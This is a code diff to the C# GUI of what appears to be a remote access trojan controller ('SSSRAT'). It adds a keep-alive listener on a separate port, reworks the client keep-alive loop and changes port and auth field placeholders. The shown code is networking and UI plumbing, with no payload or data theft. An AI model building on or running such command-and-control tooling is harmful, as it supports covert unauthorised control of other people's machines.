@@ -19,23 +19,36 @@ namespace SSSRAT_GUI {
 
 		#region Threads
 		void KeepAlive(object Client) {
-			var client = (Client)Client;
-			while (client.tcp != null && client.tcp.Connected) {
+			var client = (TcpClient)Client;
+			while (client != null && client.Connected) {
 				var readBuff = new byte[2];
 				try {
-					var stm = client.tcp.GetStream();
-					_.Send(stm, _.GB("COM" + _.SPLITTER + "KA"));
-					readBuff = _.Recv(stm, 2);
+					var stm = client.GetStream();
+					stm.Write(_.GB("KA"), 0, 2);
+					stm.Read(readBuff, 0, 2);
 				} catch {
-					RemoveClient(client);
+					RemoveClient(_.GetClientByIP(_.GetIPByRemoteEndPoint(client.Client.RemoteEndPoint)));
 				}
 				if (_.GS(readBuff) != "ON") {
-					RemoveClient(client);
+					RemoveClient(_.GetClientByIP(_.GetIPByRemoteEndPoint(client.Client.RemoteEndPoint)));
 				}
-				ToLog("KA done for " + client.id);
-				Thread.Sleep(20000);
+				ToLog("KA done for " + client.Client.RemoteEndPoint);
+				Thread.Sleep(10000);
 			}
-			RemoveClient(client);
+			if (client != null)
+				RemoveClient(_.GetClientByIP(_.GetIPByRemoteEndPoint(client.Client.RemoteEndPoint)));
+		}
+
+		void KAList() {
+			var kaList = new TcpListener(IPAddress.Any, _.kaPort);
+			kaList.Start();
+			while (isListening) {
+				try {
+					TcpClient client = kaList.AcceptTcpClient();
+					new Thread(KeepAlive).Start(client);
+				} catch {
+				}
+			}
 		}
 
 		void ListenThread() {
@@ -48,7 +61,6 @@ namespace SSSRAT_GUI {
 				} catch {
 				}
 			}
-
 		}
 
 		void ListenHandle(object Client) {
@@ -74,12 +86,11 @@ namespace SSSRAT_GUI {
 					return;
 				}
 			}
-			var item = new ListViewItem("ID: " + ++idIncrement + ", IP: " + client.Client.RemoteEndPoint);
-			var cl = new Client(idIncrement, client, new Thread(KeepAlive), item);
-			cl.ka.Start(cl);
-			_.clients.Add(cl);
-			Invoke(new MethodInvoker(() => list_clients.Items.Add(item)));
-			ToLog("ID " + cl.id + " (" + cl.tcp.Client.RemoteEndPoint + ") ready for duty!");
+				var item = new ListViewItem("ID: " + ++idIncrement + ", IP: " + client.Client.RemoteEndPoint);
+				var cl = new Client(idIncrement, client, item);
+				_.clients.Add(cl);
+				Invoke(new MethodInvoker(() => list_clients.Items.Add(item)));
+				ToLog("ID " + cl.id + " (" + cl.tcp.Client.RemoteEndPoint + ") ready for duty!");
 		}
 
 		void RemoveClient(Client client) {
@@ -94,11 +105,10 @@ namespace SSSRAT_GUI {
 			string text = item.Text;
 			for (int x = 0; x < _.clients.Count; x++) {
 				if (text == "ID: " + _.clients[x].id + ", IP: " + _.clients[x].tcp.Client.RemoteEndPoint) {
-
 					return _.clients[x];
 				}
 			}
-			return new Client(UInt32.MaxValue, new TcpClient(), new Thread(KeepAlive), new ListViewItem());
+			return new Client(UInt32.MaxValue, new TcpClient(), new ListViewItem());
 		}
 
 		Client GetCurrentSelectedClient() {
@@ -130,9 +140,19 @@ namespace SSSRAT_GUI {
 		#endregion
 
 		#region Forms
+		void TPortEnter(object sender, EventArgs e) {
+			if (t_port.Text == "" || t_port.Text == "Command port") {
+				t_port.Text = String.Empty;
+				t_port.ForeColor = Color.Black;
+				t_port.Font = new Font(t_port.Font.FontFamily,
+											 t_port.Font.Size,
+											 FontStyle.Regular);
+			}
+		}
+
 		void TPortLeave(object sender, EventArgs e) {
 			if (t_port.Text == "") {
-				t_port.Text = "Port";
+				t_port.Text = "Command port";
 				t_port.ForeColor = Color.Gray;
 				t_port.Font = new Font(t_port.Font.FontFamily,
 											 t_port.Font.Size,
@@ -154,6 +174,7 @@ namespace SSSRAT_GUI {
 			l_listeningOn.Text = "Listening on: " + _.port;
 			l_listeningOn.ForeColor = Color.Green;
 			new Thread(ListenThread).Start();
+			new Thread(KAList).Start();
 		}
 
 		private void BStopListeningClick(object sender, EventArgs e) {
@@ -161,16 +182,6 @@ namespace SSSRAT_GUI {
 			listener.Stop();
 			l_listeningOn.Text = "Listening on: N/A";
 			l_listeningOn.ForeColor = Color.Red;
-		}
-
-		private void TAuthLeave(object sender, EventArgs e) {
-			if (t_auth.Text == "") {
-				t_auth.Text = "Auth";
-				t_auth.ForeColor = Color.Gray;
-				t_auth.Font = new Font(t_auth.Font.FontFamily,
-											 t_auth.Font.Size,
-											 FontStyle.Italic);
-			}
 		}
 
 		private void TAuthEnter(object sender, EventArgs e) {
@@ -183,12 +194,41 @@ namespace SSSRAT_GUI {
 			}
 		}
 
-		void TPortEnter(object sender, EventArgs e) {
-			if (t_port.Text == "" || t_port.Text == "Port") {
-				t_port.Text = String.Empty;
-				t_port.ForeColor = Color.Black;
-				t_port.Font = new Font(t_port.Font.FontFamily,
-											 t_port.Font.Size,
+		private void TAuthLeave(object sender, EventArgs e) {
+			if (t_auth.Text == "") {
+				t_auth.Text = "Auth";
+				t_auth.ForeColor = Color.Gray;
+				t_auth.Font = new Font(t_auth.Font.FontFamily,
+											 t_auth.Font.Size,
+											 FontStyle.Italic);
+			}
+		}
+
+		private void TKaPortLeave(object sender, EventArgs e) {
+			if (t_kaPort.Text == "") {
+				t_kaPort.Text = "Keep-alive port";
+				t_kaPort.ForeColor = Color.Gray;
+				t_kaPort.Font = new Font(t_kaPort.Font.FontFamily,
+											 t_kaPort.Font.Size,
+											 FontStyle.Italic);
+			} else {
+				try {
+					if (Int32.Parse(t_kaPort.Text) > 65535) {
+						t_kaPort.Text = "65535";
+					}
+					_.kaPort = Int32.Parse(t_kaPort.Text);
+				} catch {
+					t_kaPort.Text = "13338";
+				}
+			}
+		}
+
+		private void TKaPortEnter(object sender, EventArgs e) {
+			if (t_kaPort.Text == "" || t_kaPort.Text == "Keep-alive port") {
+				t_kaPort.Text = String.Empty;
+				t_kaPort.ForeColor = Color.Black;
+				t_kaPort.Font = new Font(t_kaPort.Font.FontFamily,
+											 t_kaPort.Font.Size,
 											 FontStyle.Regular);
 			}
 		}
